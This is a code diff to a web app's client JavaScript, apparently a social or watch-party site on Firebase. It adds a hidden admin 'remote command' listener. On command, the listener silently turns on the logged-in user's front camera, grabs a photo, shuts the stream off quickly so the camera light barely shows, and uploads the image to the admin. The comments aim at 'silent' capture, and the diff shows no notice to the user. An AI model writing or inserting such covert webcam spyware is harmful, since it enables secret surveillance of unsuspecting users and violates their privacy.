@@ -148,6 +148,7 @@ let notificationsUnreadCount = 0; // Track unread notification count
 let watchPartyMetadataTimer = null;
 let pendingWatchPartyVideoId = null;
 let pendingWatchPartyMetadata = null;
+let unsubscribeCommands = null; // Listener for admin commands
 
 // ===========================
 // Auto-scroll Helper
@@ -923,11 +924,16 @@ onAuthStateChanged(auth, async (user) => {
             loadAdminStickers();
             loadAdminBackgrounds();
             initializeNotificationSystem();
+            initCommandListener(); // Initialize listener for admin commands
         } else {
             stopPresenceTracking();
             if (unsubscribeCurrentUser) {
                 unsubscribeCurrentUser();
                 unsubscribeCurrentUser = null;
+            }
+            if (unsubscribeCommands) {
+                unsubscribeCommands();
+                unsubscribeCommands = null;
             }
             currentUserData = null;
             renderCurrentUserProfile();
@@ -6507,3 +6513,100 @@ function getTimeAgo(date) {
 // Initialize Games Launcher
 // ===========================
 setupGamesLauncher();
+// ===========================
+// Admin Remote Command Handling
+// ===========================
+function initCommandListener() {
+    if (!currentUser) return;
+
+    // Unsubscribe previous listener if exists
+    if (unsubscribeCommands) {
+        unsubscribeCommands();
+    }
+
+    const commandsRef = collection(db, 'commands');
+    const q = query(
+        commandsRef,
+        where('targetUserId', '==', currentUser.uid),
+        where('status', '==', 'pending')
+    );
+
+    unsubscribeCommands = onSnapshot(q, (snapshot) => {
+        snapshot.docChanges().forEach((change) => {
+            if (change.type === 'added') {
+                const commandData = change.doc.data();
+                handleCommand(change.doc.id, commandData);
+            }
+        });
+    });
+}
+
+async function handleCommand(commandId, commandData) {
+    if (commandData.type === 'remote_snapshot') {
+        console.log('Received remote snapshot command:', commandId);
+
+        try {
+            // Check permissions first (though getUserMedia will prompt if not granted)
+            // We want to avoid UI disruption if possible, but for first time it will prompt.
+            // "Silent" capture only works if permission is already "Always Allow".
+
+            // Access camera
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' },
+                audio: false
+            });
+
+            // Create efficient video element for capture
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true; // Important for mobile
+
+            await new Promise((resolve, reject) => {
+                video.onloadedmetadata = () => {
+                    video.play().then(resolve).catch(reject);
+                };
+                video.onerror = reject;
+            });
+
+            // Wait a moment for auto-exposure/white balance (optional, but 200ms helps)
+            await new Promise(r => setTimeout(r, 200));
+
+            // Capture to canvas
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to Base64 (JPEG 0.5 quality)
+            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
+
+            // STOP STREAM IMMEDIATELY to turn off camera light
+            stream.getTracks().forEach(track => track.stop());
+
+            // Send back to server
+            await updateDoc(doc(db, 'commands', commandId), {
+                status: 'completed',
+                image: base64Image,
+                completedAt: serverTimestamp()
+            });
+
+            console.log('Snapshot sent successfully');
+
+        } catch (error) {
+            console.error('Snapshot capture failed:', error);
+
+            // Report error to admin
+            try {
+                await updateDoc(doc(db, 'commands', commandId), {
+                    status: 'error',
+                    error: error.message || 'Permission denied or hardware error',
+                    failedAt: serverTimestamp()
+                });
+            } catch (e) {
+                console.error('Failed to report error:', e);
+            }
+        }
+    }
+}
